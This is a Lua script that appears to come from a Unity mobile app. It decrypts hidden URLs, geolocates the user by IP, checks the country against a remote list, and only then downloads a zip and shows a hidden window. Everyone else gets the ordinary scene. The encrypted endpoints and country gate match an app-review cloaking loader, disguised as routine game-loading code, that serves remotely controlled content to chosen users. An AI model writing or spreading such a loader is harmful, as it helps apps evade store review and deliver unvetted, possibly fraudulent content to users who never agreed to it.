function HandleAPI(api)
    if api.typeValidate == 0 then
        FailLoad()
    elseif api.typeValidate == 1 then
        LoadZipDownload(api.urlLanguage)
    elseif api.typeValidate == 2 then
        GetUserCountry(api)
    else
        FailLoad()
    end
end

function GetUserCountry(api)
    local ipAPI = Decrypt(api.ipAPI)
    Unity.RequestWeb(ipAPI, function(response)
        local countryInfo = JsonUtility.FromJson(response)
        CompareCountry(countryInfo.country, api.urlCountry)
    end)
end

function CompareCountry(userCountry, countryListURL)
    local url = Decrypt(countryListURL)
    Unity.RequestWeb(url, function(response)
        local list = Split(response, ",")
        for i, country in ipairs(list) do
            if TrimLower(country) == TrimLower(userCountry) then
                LoadZipDownload(Unity.typename)
                return
            end
        end
        FailLoad()
    end)
end

function LoadZipDownload(url)
    url = Decrypt(url)
    Unity.DownloadZip(url)
end

function HandlePostDownload()
    Unity.Call_makeKeyAndVisible()
end

function HandleError(errorMessage)
    FailLoad()
end

function FailLoad()
    Zo.isCan = false
    Unity.LoadScene(0)
end

-- Helpers
function Decrypt(str)
    return Unity.Decrypt(str)
end

function TrimLower(str)
    return string.lower(str:match("^%s*(.-)%s*$"))
end

function Split(inputstr, sep)
    if sep == nil then sep = "%s" end
    local t = {}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
        table.insert(t, str)
    end
    return t
end
